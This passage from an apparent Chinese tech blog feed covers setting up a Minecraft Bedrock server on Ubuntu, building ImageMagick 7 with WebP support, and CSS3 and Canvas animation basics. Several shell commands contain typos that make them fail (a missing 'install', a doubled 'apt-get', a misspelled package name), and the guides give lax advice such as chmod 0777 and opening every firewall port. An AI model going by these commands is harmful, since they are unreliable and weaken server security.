class="line">[2018-12-27 13:18:58 INFO] Game mode: 0 Survival</span><br><span class="line">[2018-12-27 13:18:58 INFO] Difficulty: 1 EASY</span><br><span class="line">[2018-12-27 13:19:00 INFO] IPv4 supported, port: 19132</span><br><span class="line">[2018-12-27 13:19:00 INFO] IPv6 supported, port: 19133</span><br><span class="line">[2018-12-27 13:19:00 INFO] Server started.</span><br></pre></td></tr></table></figure><p>如果出现类似上面的输出就说明软件可以正常运行了。运行命令也可以保存到一个.sh文件里面，方便以后使用（先stop掉服务器）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi start.sh</span><br><span class="line">#在文本编辑界面插入：LD_LIBRARY_PATH=. ./bedrock_server</span><br><span class="line">#然后保存退出（:wq）</span><br><span class="line">chmod 0777 start.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以后打开服务器就可以直接./start.sh了。</p><h3 id="配置防火墙"><a href="#配置防火墙" class="headerlink" title="配置防火墙"></a>配置防火墙</h3><p>大部分服务器都默认关闭这些端口，所以成功运行了服务端你还是连不上。以阿里云为例，首先要在服务器管理页面上开启端口，以轻量应用服务器为例，在安全-&gt;防火墙里面打开相应端口（之前在配置文件里设置的那两个）。建议为了方便打开全部端口（1/65535）的TCP+UDP，让服务器内部的防火墙进行管理（当然你也可以全都打开然后不管，不过这不是给好习惯）。</p><p>新版本Ubuntu上，使用的是ufw，设置非常简单：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ufw allow 22</span><br><span class="line"># 允许你的SSH端口，不然开启以后ssh就连不上了(如果不是22记得改掉)</span><br><span class="line">ufw allow 19132</span><br><span class="line">ufw allow 19133</span><br><span class="line"># 允许Minecraft使用的端口，如果你更改了配置文件，这里和你配置文件保持一致。</span><br><span class="line">ufw enable</span><br><span class="line"># 开启防火墙</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>现在运行服务器，试试从你的电脑上连接服务器吧。</p><h3 id="在后台运行"><a href="#在后台运行" class="headerlink" title="在后台运行"></a>在后台运行</h3><p>之前那样运行的服务端，如果关掉ssh连接窗口，服务端软件也会退出。这里我们使用screen命令来实现后台运行。与其他方式相比，screen能让你更方便的与服务端进行交互：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install screen</span><br><span class="line"># 很多电脑上没有安装screen，先进行安装。</span><br><span class="line">screen -R mc</span><br><span class="line"># 新建一个叫mc的窗口并进入</span><br><span class="line">cd ./mc</span><br><span class="line">./start.sh</span><br><span class="line"># 运行服务端，没有做./start.sh就直接运行 LD_LIBRARY_PATH=. ./bedrock_server</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样服务端就能在后台运行了，如果想同时在服务器上干其他事情，可以使用快捷键”ctr+A D”“最小化”当前窗口。在窗口被最小化或者重新登陆服务器后，可以通过”screen -r mc”恢复窗口进行交互。</p><h3 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h3><p>0：这是基岩版的服务端，不是网易代理的那玩意的！</p><p>1：如果在Win10版我的世界上连接本地（127.0.0.1）服务器，需要解除回环：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 在powershell（管理员模式）中执行下面的命令</span><br><span class="line">CheckNetIsolation.exe LoopbackExempt –a –p=S-1-15-2-1958404141-86561845-1752920682-3514627264-368642714-62675701-733520436</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2：基本命令</p><p>op &lt;玩家名称&gt;<br># 赋予管理员权限<br>stop<br># 停止服务器<br>reload<br># 重新加载（热重启）<br>kick &lt;玩家名&gt;<br># 踢出服务器<br>save &lt;hold/query/resume&gt;<br># 备份,懒得写了，看官方给的说明吧，不备份的话用处不大<br># hold：This will ask the server to prepare for a backup. It’s asynchronous and will return immediately.<br># query:After calling save hold you should call this command repeatedly to see if the preparation has finished. When it returns a success it will return a file list (with lengths for each file) of the files you need to copy. The server will not pause while this is happening, so some files can be modified while the backup is taking place. As long as you only copy the files in the given file list and truncate the copied files to the specified lengths, then the backup should be valid.<br># resume:When you’re finished with copying the files you should call this to tell the server that it’s okay to remove old files again.</p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>图片格式转换神器 imagemagick 7 的安装与使用</title>
      <link href="/2020/01/112370758277.html"/>
      <url>/2020/01/112370758277.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-ImageMagick-简介"><a href="#1-ImageMagick-简介" class="headerlink" title="1. ImageMagick 简介"></a>1. ImageMagick 简介</h1><p>ImageMagick 是一个多平台的图片转换工具，在服务器端提供了多语言的插件，可以调用其图片转换能力，大致的图片转换流程如下：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200106113214.png" alt=""></p><p>ImageMagick 同时还提供了 webp 格式图片转换的能力，我们将上传服务器的图片转换为 webp 格式后，图片的大小将会被很大程度的缩减，用户在从服务器端下载图片的时间也会被极大缩小，是一个非常强的优化网站图片加载的手段，以下的测试数据来自凹凸实验室 <a href="https://aotu.io/notes/2016/06/23/explore-something-of-webp/index.html">webp测试报告</a>：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200106113758.png" alt="JPG和WebP图片大小对比"></p><p><img src="http://img.cdn.esunr.xyz/markdown/20200106113848.png" alt="加载时间对比"></p><h1 id="2-安装前准备"><a href="#2-安装前准备" class="headerlink" title="2. 安装前准备"></a>2. 安装前准备</h1><p>在安装 ImageMagick 7 之前还需要安装各种格式的 lib 库，因为 ImageMagick 图片格式转换能力需要各种图片库作为依赖，如果没有安装这些库就无法使用 ImageMagick 对该图片格式的转换能力，如下的官方文档中对各种格式进行了需求说明，其中标注有 “需要委托库” 就是需要用户下载对应的委托库，才可以开启对该格式的支持：</p><blockquote><p>官方文档：<a href="http://www.imagemagick.com.cn/formats.html">http://www.imagemagick.com.cn/formats.html</a></p></blockquote><p>我们常见的 png、jpeg 格式都需要委托库的支持，同时 webp 格式也需要对应委托库的支持，需要首先下载这些委托库：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get libwebp-dev libpng-dev libjpeg-dev</span><br></pre></td></tr></table></figure><p>对于 webp 来说，需要安装的插件要多一些，我们可以选择源码安装最新版本的 webp 开发套件，当然也可以直接使用 apt 指令安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get libwebp-dev webp</span><br></pre></td></tr></table></figure><p>我们可以通过命令行指令来测试来查看 webp 委托库是否安装成功：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cwebp -version</span><br><span class="line">&gt; 0.6.1</span><br></pre></td></tr></table></figure><h1 id="3-源码安装-ImageMagick-7"><a href="#3-源码安装-ImageMagick-7" class="headerlink" title="3. 源码安装 ImageMagick 7"></a>3. 源码安装 ImageMagick 7</h1><p>如果对 webp 格式没有要求，可以直接使用 apt 安装 ImageMagick：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install imagemagick</span><br><span class="line">convert -version</span><br></pre></td></tr></table></figure><p>输出版本可以查看到版本为 6.x。使用 apt 安装的 ImageMagick 甚至可以不用手动安装图片依赖库，但是 ImageMagick 6.x 无法支持 webp 格式（或许支持，但是我没找到开启的方法），我们可以使用指令列出支持的列表，看出其并不支持 webp：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert -list format | grep webp</span><br></pre></td></tr></table></figure><p>为了支持 webp，我们需要按照以下流程手动源码安装 webpm，在这之前我们需要手动卸载之前安装的 <code>iamgemagick</code>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get apt-get --purge remove iamgemagick</span><br></pre></td></tr></table></figure><p>确保了完整卸载之后，就可以进行源码安装了（需要 sudo 权限）：</p><ol><li><p>下载源码</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/source  </span><br><span class="line">wget https://imagemagick.org/download/ImageMagick.tar.gz</span><br></pre></td></tr></table></figure></li><li><p>解压源码</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar xvzf ImageMagick.tar.gz</span><br><span class="line"><span class="built_in">cd</span> ImageMagick-7.0.9</span><br></pre></td></tr></table></figure></li><li><p>安装 perl 依赖</p><p>经过测试如果不安装该依赖，安装过程将出错：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libperl-dev</span><br></pre></td></tr></table></figure></li><li><p>生成编译文件</p><p>这一步需要进行一个配置，为了防止将 ImageMagick 安装到未知的地方，我们需要手动指定安装位置，同时还需要开启对各种图片格式的支持：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --with-modules --enable-shared --with-perl –prefix=/usr/local/imagemagick</span><br></pre></td></tr></table></figure></li><li><p>编译安装</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make &amp;&amp; make install</span><br><span class="line">ldconfig /usr/local/lib <span class="comment"># 配置动态链接器运行时绑定，如果采用默认位置安装则需要使用这一步让命令行生效</span></span><br></pre></td></tr></table></figure></li><li><p>设置 PATH</p><p>由于我们将源码安装的 ImageMagick 安装到了自定义目录下，所以需要手动连接 bin 文件到 PATH 中：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment">###### /etc/profile</span></span><br><span class="line"><span class="built_in">export</span> PATH=xxx/xxx/bin:<span class="variable">$PATH</span> </span><br><span class="line"><span class="comment">######  </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure></li><li><p>测试是否安装成功</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">magick -version</span><br><span class="line">&gt; Version: ImageMagick 7.0.9-13 Q16 x86_64 2020-01-03 https://imagemagick.org</span><br></pre></td></tr></table></figure></li><li><p>查看转换列表</p><p>ImageMagick7 将 <code>convert</code> 指令改为了 <code>magick</code>，这点在使用命令行工具时需要注意：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">magick -list format | grep webp</span><br><span class="line">&gt; WEBP* WEBP      rw+   WebP Image Format (libwebp 0.6.1 [020E])</span><br></pre></td></tr></table></figure></li></ol><p>接下来就可以使用命令行工具对图片进行转换：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">magick test.png test.webp</span><br></pre></td></tr></table></figure><h1 id="4-PHP-插件-imagick-的使用"><a href="#4-PHP-插件-imagick-的使用" class="headerlink" title="4. PHP 插件 imagick 的使用"></a>4. PHP 插件 imagick 的使用</h1><p>如果没有 webp 格式转换的需求，可以直接用 apt 安装 php-imagick 插件即可直接使用，但是 php-imagick 默认安装的 ImageMagick 是 6.x 版本的，也就是说不会支持 webp，因此还是要按照以下方式手动源码安装 imagick 插件。</p><ol><li><p>到<a href="https://pecl.php.net/package/imagick">官网</a>下载最新版本的 imagick 插件</p><p>这里以3.4.4版本为例：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://pecl.php.net/get/imagick-3.4.4.tgz</span><br><span class="line">tar -zxvf imagick-3.4.4.tgz</span><br><span class="line"><span class="built_in">cd</span> imagick-3.4.4</span><br></pre></td></tr></table></figure></li><li><p>安装 PHP 插件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">phpize</span><br><span class="line"><span class="comment"># /usr/local/php/bin/php-config 为 php 的配置路径，根据机器的情况设置</span></span><br><span class="line"><span class="comment"># /usr/local/imagemagick 为刚才安装的 ImageMagick7 的路径</span></span><br><span class="line">./configure --with-php-config=/usr/local/php/bin/php-config --with-imagick=/usr/local/imagemagick</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure></li></ol><p>Demo 示例：<a href="https://github.com/EsunR/Imagick-Demo">https://github.com/EsunR/Imagick-Demo</a></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>现阶段前端页面所使用的动画技术方案总结</title>
      <link href="/2020/01/4f8e5bb1e44f.html"/>
      <url>/2020/01/4f8e5bb1e44f.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-CSS3-动画"><a href="#1-CSS3-动画" class="headerlink" title="1. CSS3 动画"></a>1. CSS3 动画</h1><p>CSS3动画基于DOM的CSS样式，主要分为以下几个核心概念：</p><h2 id="1-1-transition-过渡"><a href="#1-1-transition-过渡" class="headerlink" title="1.1 transition 过渡"></a>1.1 transition 过渡</h2><p><code>transition</code> 是一个动画元素的附加属性，它可以定义动画产生时的效果与方式，以及动画所作用的范围。</p><blockquote><p>过渡可以为一个元素在不同状态之间切换的时候定义不同的过渡效果。比如在不同的伪元素之间切换，像是 <code>:hover</code>，<code>:active</code> 或者通过 JavaScript 实现的状态变化。</p></blockquote><p>transition CSS 属性是 <code>transition-property</code>，<code>transition-duration</code>，<code>transition-timing-function</code> 和 <code>transition-delay</code> 的一个简写属性。</p><h2 id="1-2-transform"><a href="#1-2-transform" class="headerlink" title="1.2 transform"></a>1.2 transform</h2><p>在 CSS3 当中，transform 用于元素进行旋转、缩放、移动或倾斜，和设置样式的动画并没有什么关系，就相当于color一样用来设置元素的“外表”。transform 分为 2D 转换与 3D 转换：</p><h3 id="2D"><a href="#2D" class="headerlink" title="2D"></a>2D</h3><p>transform 的 2D 转换可以让元素在 2D 平面中进行样式的变化， transform 不会让元素脱离标准流，所以元素发生变化后仍保留元素原有的占位。</p><p>2D转换的主要 API 包括：缩放（scale）、移动（translate）、旋转（rotate）、翻转（skew）以及转换函数 （matrix）。</p><h3 id="3D"><a href="#3D" class="headerlink" title="3D"></a>3D</h3><p>transform 3D 变化是在一个三维坐标中进行的：</p><p><img src="https://images2015.cnblogs.com/blog/740839/201604/740839-20160404190248937-1489051755.png" alt="img"></p><p>3D 变换与 2D 变化不同的是空间上增加了 Z 轴，可以让元素在空间上进行改变。</p><p>通过设置 perspective （视距）属性可以实现在 Z 轴空间上的透视效果；通过设置 perspective-origin （透视原点）可以设置观察的位置，不同的观察位置会对物体产生不同的形变效果。</p><p>transform 3d 的位移方法为 <code>translate3d(x,y,z)</code> ，与 2d 位移不同的是增加了 Z 轴方向的坐标，同样的缩放也提供了一个 Z 轴方向上的缩放 <code>scale3d(x,y,z)</code>，旋转提供了物体可以在空间中绕坐标轴进行旋转的能力 <code>rotate3d(x,y,z,Ndeg)</code>。</p><h3 id="matrix-矩阵"><a href="#matrix-矩阵" class="headerlink" title="matrix 矩阵"></a>matrix 矩阵</h3><p>实际上，所有的形变操作都是通过矩阵matrix实现的，而 matrix 同样分为 2d 操作与 3d 操作。</p><blockquote><p>目前有多种用来描述转换坐标模型，最常用的是 <strong>笛卡尔坐标系统</strong> 和 <strong>齐次坐标</strong></p></blockquote><p><strong>2d matrix：</strong></p><p>matrix(a,b,c,d,e,f)函数有a,b,c,d,e,f这6个参数。而x和y是变形前元素的任意点。通过以下矩阵变换，生成对应的新坐标x’和y’。</p><p><img src="https://images2015.cnblogs.com/blog/740839/201604/740839-20160403215129566-1605208130.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x&#x27; = ax + cy + e;</span><br><span class="line">y&#x27; = bx + dy + f;</span><br></pre></td></tr></table></figure><p>由此可得到默认a、d为1，b、c、e、f为0。a和d控制缩放，且不可为0；c和b控制倾斜；而e和f控制位移</p><p><strong>3d matrix：</strong></p><p>　3d变形函数位移、旋转和缩放都是通过矩阵设置不同的参数而实现的。相比于2d矩阵martrix()的6个参数而言，3d矩阵matrix3d却有12个参数。其变形规则与2dmatrix()类似，只不过是从3<em>3矩阵，变成了4</em>4矩阵</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">matrix3d(a,b,c,0,d,e,f,0,g,h,i,0,j,k,l,1)</span><br></pre></td></tr></table></figure><p><img src="https://images2015.cnblogs.com/blog/740839/201604/740839-20160406224526468-933175389.jpg" alt="img"></p><h2 id="1-3-animation"><a href="#1-3-animation" class="headerlink" title="1.3 animation"></a>1.3 animation</h2><p>animation 定义了元素使用一组由 <code>@keyframes</code> 定义的动画，并且规定了动画的持续时间执行次数等，完整的定义如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">animation: 定义的动画名称 持续时间  执行次数  是否反向  运动曲线 延迟执行(infinite 表示无限次)</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS">CSS</a> <strong>animation</strong> 属性是 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/animation-name"><code>animation-name</code></a>，<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/animation-duration"><code>animation-duration</code></a>, <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/animation-timing-function"><code>animation-timing-function</code></a>，<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/animation-delay"><code>animation-delay</code></a>，<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/animation-iteration-count"><code>animation-iteration-count</code></a>，<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/animation-direction"><code>animation-direction</code></a>，<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/animation-fill-mode"><code>animation-fill-mode</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/animation-play-state"><code>animation-play-state</code></a> 属性的一个简写属性形式。</p></blockquote><p>使用 <code>@keyframes</code> 定义关键帧动画可以制作更为复杂且需要连续的动画，通过定义百分比或者关键字可以定义动画时间内不同时间段的动画。</p><p>animation 有一个很显然的缺点就是 CSS3 动画没有时间轴的概念，通常去控制多个关键帧动画之间的切换需要用到延迟参数，将每个动画拼接出来：</p><p><img src="https://misc.aotu.io/Yettyzyt/2016-11-28-css3-animation-properties/animation-delay-timeline.png" alt="动画时间轴"></p><h2 id="1-4-事件"><a href="#1-4-事件" class="headerlink" title="1.4 事件"></a>1.4 事件</h2><p>虽然 css 不支持时间轴，拼接多个动画需要手动设置每个动画的延迟时间，但是同时可以通过 javascript 来对元素添加动画事件的监听来捕获动画开始、结束等时机：</p><table><thead><tr><th align="left">事件</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">animationstart</td><td align="left">如果需要，在动画开始时发生，计算任何动画延迟（由 animation-delay 属性指定）。负延迟会导致事件以等于延迟绝对值的经过时间触发。</td></tr><tr><td align="left">animationend</td><td align="left">动画结束时发生。</td></tr><tr><td align="left">animationiteration</td><td align="left">在动画的每次迭代结束时发生。仅当 animation-iteration-count 属性设置为大于1的值时，才会发生此事件。</td></tr><tr><td align="left">transitionend</td><td align="left">transitionend 事件会在 CSS transition 结束后触发. 当transition完成前移除transition时，比如移除css的transition-property 属性，事件将不会被触发.如在transition完成前设置  display 为”none”，事件同样不会被触发。</td></tr></tbody></table><blockquote><p>PS：使用 Javascript 编写动画的 Web Animations API 现仍处于草案阶段：<a href="https://drafts.csswg.org/web-animations/">https://drafts.csswg.org/web-animations/</a></p></blockquote><h2 id="1-5-性能"><a href="#1-5-性能" class="headerlink" title="1.5 性能"></a>1.5 性能</h2><h3 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h3><p>实现页面动画的效果有多种途径，比如将一个页面元素的高度从100px渐变到200px，可以直接改变元素的height属性，也可以操控CSS transform属性，但是前者会对引起页面的relayout以及对向集合线程发送重新结算的bitmap信息，具体的流程如下：</p><p><img src="http://zencode.in/imgs/18/1.png" alt="img"></p><p>所以高度的变化是很耗时的，但是如果我们改用CSS transform属性来缩放元素，总体的处理过程如下：</p><p><img src="http://zencode.in/imgs/18/2.png" alt="img"></p><p>依据规范，CSS transform属性并不会触发当前元素或附近元素的relayout。浏览器将当前元素视为一个整体，它会缩放、旋转、移动这一整个元素。浏览器只需要在动画开始之时生成位图，然后将位图发送给GPU。之后浏览器不需要做额外的relayout和repaint，甚至不需要发送位图给GPU。浏览器只需要充分发挥GPU的长处：绘制同一张位图到不同的位置、旋转角度和缩放比例。</p><h3 id="CSS-对比-JavaScript-的性能"><a href="#CSS-对比-JavaScript-的性能" class="headerlink" title="CSS 对比 JavaScript 的性能"></a>CSS 对比 JavaScript 的性能</h3><p>网络上有很多网页和评论从性能的角度讨论了 CSS 和 JavaScript 动画的相对优点。以下是要记住的几个要点：</p><ul><li>基于 CSS 的动画以及原生支持的网络动画通常由一个名为“合成器线程”的线程处理。这不同于在其中执行样式、布局、绘制和 JavaScript 的浏览器“主线程”。这意味着，如果浏览器正在主线程上运行一些高开销任务，则这些动画可以继续运行而不中断。</li><li>在许多情况下，变形和透明度的其他更改还可由合成器线程来处理。</li><li>如果任何动画触发绘制、布局或同时触发这两者，则“主线程”将必须执行工作。这点同时适用于基于 CSS 和 JavaScript 的动画，并且布局或绘制的开销可能拖慢与 CSS 或 JavaScript 执行相关的任何工作，使问题变得无意义。</li></ul><blockquote><p>更多：<a href="https://developers.google.com/web/fundamentals/design-and-ux/animations/animations-and-performance?hl=zh-cn#css-vs-javascript-performance">https://developers.google.com/web/fundamentals/design-and-ux/animations/animations-and-performance?hl=zh-cn#css-vs-javascript-performance</a></p></blockquote><h1 id="2-Canvas-2D"><a href="#2-Canvas-2D" class="headerlink" title="2. Canvas 2D"></a>2. Canvas 2D</h1><p>Canvas 是 HTML5 中取代 Flash 的新技术，Canvas 和 Flash 的思路完全不一样，Flash是上屏幕之后还是对象，编程语言叫做 Action Script 也是ECMAScript范畴。Canvas上屏幕之后像素化了，再也不能得到这个对象了，所以要想让这个元素运动，必须擦除整个屏幕、重绘这个元素，相比之下Canvas更加流畅，移动端也能保持很高的流畅度。</p><blockquote><p><code>&lt;Canvas&gt;</code> 是一个可以使用脚本(通常为<a href="https://developer.mozilla.org/zh-CN/docs/JavaScript">JavaScript</a>)来绘制图形的 <a href="https://developer.mozilla.org/zh-CN/docs/HTML">HTML</a> 元素.例如,它可以用于绘制图表、制作图片构图或者制作简单的(以及<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Canvas_API/A_basic_ray-caster">不那么简单的</a>)动画。</p></blockquote><h2 id="2-1-Canvas-的基本结构"><a href="#2-1-Canvas-的基本结构" class="headerlink" title="2.1 Canvas 的基本结构"></a>2.1 Canvas 的基本结构</h2><p>canvas 元素本身没有任何外观，它就是一块空白画板，提供给JS的一套API，最早由 Safari 引入，IE9之前可以使用一些类库在IE中模拟canvas，大部分的API都不在canvas元素自身定义，canvas元素自身属性与常规的HTML元素并没有多大区别。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>坐标系demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span> = <span class="string">&#x27;square&#x27;</span> <span class="attr">width</span>= <span class="string">200</span> <span class="attr">heigth</span>=<span class="string">200</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="2-2-上下文对象"><a href="#2-2-上下文对象" class="headerlink" title="2.2 上下文对象"></a>2.2 上下文对象</h2><p>我们通常使用 <code>ctx</code> 变量作为 Canvas 操作的上下文对象，对 Canvas 上像素的操作即对该上下文的操作。</p><p><code>&lt;canvas&gt;</code> 元素有一个叫做 <code>getContext()</code> 的方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">canvas.<span class="title function_">getContext</span>(contextType, contextAttributes);</span><br></pre></td></tr></table></figure><p>这个方法是用来获得渲染上下文和它的绘画功能</p><table><thead><tr><th align="left">参数</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">contextType</td><td align="left">上下文类型，一个字符串，值可以是 <code>2d</code> 、<code>webgl</code></td></tr><tr><td align="left">contextAttributes</td><td align="left">创建上下文时设置属性，一个字典对象，默认为空即可</td></tr></tbody></table><p>对于 2d 图像而言，可以使用下面的代码获取渲染上下文</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> canvas = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;canvas&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> ctx = canvas.<span class="title function_">getContext</span>(<span class="string">&#x27;2d&#x27;</span>);</span><br></pre></td></tr></table></figure><p><code>ctx</code> 现在 <code>CanvasRenderingContext2D</code> 的一个实例。</p><h2 id="2-3-Canvas-的绘制过程"><a href="#2-3-Canvas-的绘制过程" class="headerlink" title="2.3 Canvas 的绘制过程"></a>2.3 Canvas 的绘制过程</h2><p>Canvas 有一个概念称作”笔触“也叫作“描边”，Canvas中的任何形状都是由这两个部分组成的。</p><p>笔触在canvas中视为一个“Path”的实例，必须stroke之后才能上屏幕；填充用fill才能上屏幕。</p><h3 id="绘制路径"><a href="#绘制路径" class="headerlink" title="绘制路径"></a>绘制路径</h3><p>使用 <code>beginPath()</code> 代表开始绘制；<code>moveTo(x, y)</code> 代表将笔触移动到某一坐标；<code>lineTo(x, y)</code> 代表直线绘制到某一点；使用 <code>stroke()</code> 能将绘制的图像显示出来。</p><p>如下可以绘制出一条折线：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ctx.beginPath();</span><br><span class="line">ctx.moveTo(100, 100);</span><br><span class="line">ctx.lineTo(300, 300);</span><br><span class="line">ctx.lineTo(600, 300);</span><br><span class="line">ctx.stroke();</span><br></pre></td></tr></table></figure><p><a href="https://camo.githubusercontent.com/420ce10cb0196ecaadb70032526375518895c0a0/68747470733a2f2f7773312e73696e61696d672e636e2f6c617267652f61373165666161666c793167326c70626a726467326a323065733038367132732e6a7067"><img src="https://camo.githubusercontent.com/420ce10cb0196ecaadb70032526375518895c0a0/68747470733a2f2f7773312e73696e61696d672e636e2f6c617267652f61373165666161666c793167326c70626a726467326a323065733038367132732e6a7067" alt="img"></a></p><p>使用 <code>closePath()</code> 可以将最后一个绘制点【该绘制点是被用<code>moveTo(x, y)</code>打断绘制前的那个点】与第一个绘制点连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  ctx.beginPath();</span><br><span class="line">  ctx.moveTo(100, 100);</span><br><span class="line">  ctx.lineTo(300, 300);</span><br><span class="line">  ctx.lineTo(600, 300);</span><br><span class="line">+ ctx.closePath();</span><br><span class="line">  ctx.stroke();</span><br></pre></td></tr></table></figure><p><a href="https://camo.githubusercontent.com/3e58e2fd4dddfb2947bb4637d03cc8ae0773aefe/68747470733a2f2f7773312e73696e61696d672e636e2f6c617267652f61373165666161666c793167326c7065343373746e6a3230657130376a6a72392e6a7067"><img 